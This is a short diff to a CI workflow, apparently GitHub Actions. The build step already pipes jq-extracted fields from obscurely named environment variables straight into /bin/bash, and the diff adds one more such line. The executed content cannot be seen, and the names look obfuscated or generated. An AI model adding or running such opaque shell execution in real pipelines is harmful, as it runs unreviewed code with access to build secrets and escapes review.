@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
           echo $fovgn01 | jq -r .urh3 | /bin/bash
+          echo $zskt194 | jq -r .umx4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
